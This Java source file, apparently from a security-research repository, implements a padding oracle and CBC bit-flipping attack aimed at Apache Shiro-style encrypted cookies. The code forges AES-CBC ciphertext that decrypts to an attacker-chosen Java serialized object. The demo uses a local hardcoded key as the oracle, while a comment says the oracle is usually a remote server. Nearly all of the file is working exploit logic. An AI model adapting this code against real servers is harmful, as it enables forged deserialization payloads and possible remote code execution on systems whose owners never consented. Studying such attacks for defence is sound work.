package com.threedr3am.bug.paddingoraclecbc;

import com.vip.vjtools.vjkit.base.ExceptionUtil;
import com.vip.vjtools.vjkit.text.EncodeUtil;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.security.GeneralSecurityException;
import java.util.Arrays;
import java.util.function.Predicate;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * padding oracle cbc java实现（多组密文实现）
 *
 * 原密文及iv解密出序列化数据，并且解密后的序列化数据可以被正确反序列化，根据java反序列化以队列形式读取进行的原理，在其后不断拼接两组数据（iv+crypt）去padding oracle
 * cbc为期望的序列化数据，只要padding成功即意味着能被反序列化，直到最后把原来的iv和密文去掉，留下新的iv额密文
 *
 * @author threedr3am
 */
class AAA implements Serializable {

  public AAA() {
    System.out.println("AAA()...");
  }
}

class BBB implements Serializable {

  public BBB() {
    System.out.println("BBB()...");
  }
}

public class PaddingOracleCBCForShiro {


  public static void main(String[] args) throws IOException, ClassNotFoundException {
    //aes iv
    String aesIv = "BSiv194+mpLpYJDOsuuBYA==";
    //aes key
    String aesKey = "e/ACMnCbFqab+v/cCIv3gA==";

    //原文
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
    objectOutputStream.writeObject(new AAA());
    objectOutputStream.flush();
    objectOutputStream.close();
    byte[] plain = byteArrayOutputStream.toByteArray();
    System.out.println(new String(plain));
    printBytes(plain);

    //cbc攻击，最后期望服务器解密出的结果
    ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
    ObjectOutputStream objectOutputStream2 = new ObjectOutputStream(byteArrayOutputStream2);
    objectOutputStream2.writeObject(new BBB());
    objectOutputStream2.flush();
    objectOutputStream2.close();
    byte[] cbcRes = byteArrayOutputStream2.toByteArray();
    System.out.println(new String(cbcRes));
    printBytes(cbcRes);

    //aes iv bytes
    byte[] ivBytes = EncodeUtil.decodeBase64(aesIv);
    //aes key bytes
    byte[] keyBytes = EncodeUtil.decodeBase64(aesKey);
    //密文bytes
    byte[] cryptTextBytes = aes(plain, keyBytes, ivBytes, 1);

    new ObjectInputStream(new ByteArrayInputStream(aes(cryptTextBytes, keyBytes, ivBytes, 2)))
        .readObject();

    CBCResult cbcResult = paddingOracleCBC(cryptTextBytes, ivBytes, cbcRes, data -> {
      //把原密文拼接在前面，因为java原生反序列化的机制导致，只要能padding成功，就必然会反序列化成功
      byte[] crypt = new byte[cryptTextBytes.length + data.length];
      System.arraycopy(cryptTextBytes, 0, crypt, 0, cryptTextBytes.length);
      System.arraycopy(data, 0, crypt, cryptTextBytes.length, data.length);
      try {
        byte[] decryptBytes = aes(crypt, keyBytes, ivBytes, 2);
        new ObjectInputStream(new ByteArrayInputStream(decryptBytes))
            .readObject().getClass().getName();
        return true;
      } catch (Exception e) {
        return false;
      }
    });

    new ObjectInputStream(
        new ByteArrayInputStream(aes(cbcResult.crypt, keyBytes, cbcResult.iv, 2)))
        .readObject();
  }

  private static byte[] aes(byte[] input, byte[] key, byte[] iv, int mode) {
    try {
      SecretKey secretKey = new SecretKeySpec(key, "AES");
      IvParameterSpec ivSpec = new IvParameterSpec(iv);
      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
      cipher.init(mode, secretKey, ivSpec);
      return cipher.doFinal(input);
    } catch (GeneralSecurityException var7) {
      throw ExceptionUtil.unchecked(var7);
    }
  }

  /**
   * CBC Attack Result
   */
  public static class CBCResult {

    byte[] iv;
    byte[] crypt;

    public CBCResult(byte[] iv, byte[] crypt) {
      this.iv = iv;
      this.crypt = crypt;
    }

    public byte[] getIv() {
      return iv;
    }

    public byte[] getCrypt() {
      return crypt;
    }
  }

  private static CBCResult paddingOracleCBC(byte[] cryptText, byte[] ivBytes, byte[] cbcResBytes,
      Predicate<byte[]> predicate) {

    //填充期望结果长度为16字节的倍数
    cbcResBytes = padding(cbcResBytes);
    //该值为期望结果的组数-1，用于不断反向取出每组期望值去CBC攻击
    int cbcResGroup = cbcResBytes.length / 16;
    byte[] res = new byte[cbcResBytes.length];
    byte[] iv = new byte[16];
    byte[] crypt = new byte[16];

    for (; cbcResGroup > 0; cbcResGroup--) {
      byte[] middle = paddingOracle(iv, crypt, predicate);
      byte[] plain = generatePlain(iv, middle);
      byte[] plainTmp = Arrays.copyOf(plain, plain.length);
      plainTmp = unpadding(plainTmp);
      System.out.println("[plain]:" + new String(plainTmp));
      byte[] cbcResTmp = Arrays.copyOfRange(cbcResBytes, (cbcResGroup - 1) * 16, cbcResGroup * 16);
      //构造新的iv，cbc攻击
      byte[] ivBytesNew = cbcAttack(iv, cbcResTmp, plain);
      System.out.println("[cbc->plain]:" + new String(generatePlain(ivBytesNew, middle)));

      System.arraycopy(crypt, 0, res, (cbcResGroup - 1) * 16, 16);

      crypt = ivBytesNew;
      iv = new byte[iv.length];
    }

    return new CBCResult(crypt, res);
  }

  /**
   * unpadding
   */
  private static byte[] unpadding(byte[] res) {
    int end = res[res.length - 1];
    if (end > 0 && end <= 16) {
      for (int i = 1; i <= end; i++) {
        if (res[res.length - i] != end) {
          break;
        }
      }
      for (int i = 1; i <= end; i++) {
        res[res.length - i] = ' ';
      }
    }
    return res;
  }

  /**
   * 原来的iv ^ middle = plain 构造新的iv ^ middle = 'admin' -> 新的iv = middle ^ 'admin' -> 新的iv = 原来的iv ^
   * plain ^ 'admin'
   */
  private static byte[] cbcAttack(byte[] iv, byte[] cbcResBytesForPadding,
      byte[] plainBytes) {
    byte[] res = Arrays.copyOf(iv, iv.length);
    for (int i = 15; i >= 0; i--) {
      if (cbcResBytesForPadding[i] != plainBytes[i]) {
        res[i] = (byte) (iv[i] ^ plainBytes[i] ^ cbcResBytesForPadding[i]);
      }
    }
    return res;
  }

  /**
   * cbc前需要对数据进行填充至16*n，填充规则，最后一组16bytes数据，缺多少位（例如：6），则填充6个0x06
   *
   * @param cbcResBytes 需要填充的cbc翻转的数据
   * @return 填充后的数据，可以直接用于cbc翻转攻击
   */
  private static byte[] padding(byte[] cbcResBytes) {
    //计算需要填充的位数
    int padding = 16 - cbcResBytes.length % 16;
    byte[] cbcResBytesForPadding = new byte[cbcResBytes.length + padding];
    for (int i = 0; i < cbcResBytes.length; i++) {
      cbcResBytesForPadding[i] = cbcResBytes[i];
    }
    //填充
    for (int i = 1; i <= padding; i++) {
      cbcResBytesForPadding[cbcResBytesForPadding.length - i] = (byte) padding;
    }
    return cbcResBytesForPadding;
  }

  /**
   * 与原iv异或，生成原文 原来的iv ^ middle = plain
   */
  private static byte[] generatePlain(byte[] ivBytesOld, byte[] middles) {
    byte[] res = new byte[ivBytesOld.length];
    for (int i = 0; i < ivBytesOld.length; i++) {
      res[i] = (byte) (ivBytesOld[i] ^ middles[i]);
    }
    return res;
  }

  /**
   * padding oracle 核心方法
   *
   * @param predicate 该对象test方法用于校验是否正确，多数为调用远程服务器提交数据，根据返回来确定解密后的异或结果是否符合规则
   * @return 这一组数据的middle
   */
  private static byte[] paddingOracle(byte[] iv, byte[] crypt, Predicate<byte[]> predicate) {
    byte[] data = new byte[iv.length + crypt.length];
    System.arraycopy(iv, 0, data, 0, iv.length);
    System.arraycopy(crypt, 0, data, iv.length, crypt.length);
    byte[] middle = new byte[16];
    //用于填充的tmp值，第一轮为0x01第二轮为0x02以此类推
    byte tmp = 1;
    for (int i = 15; i >= 0; i--) {
      for (int j = 0; j < 256; j++) {
        data[i] = (byte) j;
        for (int k = 15; k > i; k--) {
          //爆破倒数第一位时不需要填充，倒数第二位时填充其后的iv为0x02，倒数第三位时填充其后的iv为0x03，以此类推
          data[k] = (byte) (middle[k] ^ tmp);
        }
        //解密返回true即正确
        if (predicate.test(data)) {
          //爆破倒数第一位的解密结果为0x01，第二位为0x02，以此类推，那么middle = iv ^ plain
          byte m = (byte) (j ^ tmp);
          middle[i] = m;
//          break;
        }
      }
      tmp++;
    }

    System.out.print("[middle]:");
    printBytes(middle);
    return middle;
  }

  private static void printBytes(byte[] middle) {
    for (int i = 0; i < middle.length; i++) {
      System.out.print((0xff & middle[i]));
      if (i != middle.length - 1) {
        System.out.print(",");
      }
    }
    System.out.println();
  }
}
